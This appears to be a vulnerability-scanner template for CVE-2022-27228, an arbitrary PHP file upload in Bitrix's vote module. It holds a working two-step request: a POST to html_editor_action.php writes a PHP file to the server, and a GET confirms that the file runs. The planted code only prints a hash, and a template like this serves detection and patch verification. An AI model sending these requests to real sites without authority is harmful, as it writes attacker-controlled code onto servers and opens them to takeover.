id: bitrix-cve-2022-27228-upload

info:
  name: Bitrix Vote Module Arbitrary File Upload (CVE-2022-27228)
  author: clevergod
  severity: critical
  description: |
    Arbitrary PHP file upload in /bitrix/tools/html_editor_action.php via vote.result.new path (CVE-2022-27228)
  tags: bitrix,fileupload,rce,cve,cve2022

requests:
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/tools/html_editor_action.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      sessid=123456789&action=save_file&path=/bitrix/modules/vote/install/components/bitrix/vote.result.new/templates/.default/testcve.php&content=<?php echo md5(27228); ?>
    matchers:
      - type: word
        words:
          - "success"

  - method: GET
    path:
      - "{{BaseURL}}/bitrix/modules/vote/install/components/bitrix/vote.result.new/templates/.default/testcve.php"
    matchers:
      - type: word
        condition: and
        words:
          - "0982ff04e004a0379185842c3f4c3780"  # md5(27228)